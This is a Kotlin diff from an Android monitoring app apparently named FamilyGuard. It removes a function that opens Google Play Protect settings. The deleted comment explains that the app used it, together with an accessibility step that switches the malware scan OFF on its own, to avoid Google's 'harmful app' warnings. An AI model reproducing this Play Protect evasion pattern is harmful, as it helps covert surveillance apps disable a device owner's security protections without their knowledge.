@@ -824,43 +824,6 @@ object CommandHandler {
         }
     }
 
-    /**
-     * VC17: Play Protect settings screen kholo (BAL-safe) — SelfHeal/wizard isse
-     * FamilyGuard ko Google "harmful app" warnings se bachane ke liye use karte
-     * hain (scan toggle a11y "protect" step par khud OFF click hota hai).
-     *
-     * Koi ek public component guaranteed nahi hai (GMS version ke saath badalta
-     * rehta hai), isliye CANDIDATE list — pehla jo chale wahi kaafi hai:
-     *  1. GMS PlayProtectSettingsActivity (modern)
-     *  2. GMS PlayProtectSettings (kuch builds)
-     *  3. market://playprotect deep link (Play Store resolver)
-     * Sab fail → false (caller kuch nahi karta — phone ki settings me manually).
-     */
-    fun openPlayProtect(ctx: Context): Boolean {
-        val candidates = listOf<android.content.Intent>(
-            android.content.Intent().setComponent(
-                android.content.ComponentName(
-                    "com.google.android.gms",
-                    "com.google.android.gms.security.settings.PlayProtectSettingsActivity"
-                )
-            ),
-            android.content.Intent().setComponent(
-                android.content.ComponentName(
-                    "com.google.android.gms",
-                    "com.google.android.gms.security.settings.PlayProtectSettings"
-                )
-            ),
-            android.content.Intent(
-                android.content.Intent.ACTION_VIEW,
-                android.net.Uri.parse("market://playprotect")
-            )
-        )
-        for (i in candidates) {
-            if (startActivityBalSafe(ctx) { i }) return true
-        }
-        return false
-    }
-
     /** Gallery permission background request — CameraPermActivity ka
      *  counterpart, same BAL-safe + notification-fallback pattern. */
     private fun requestGalleryPerm(ctx: Context) {
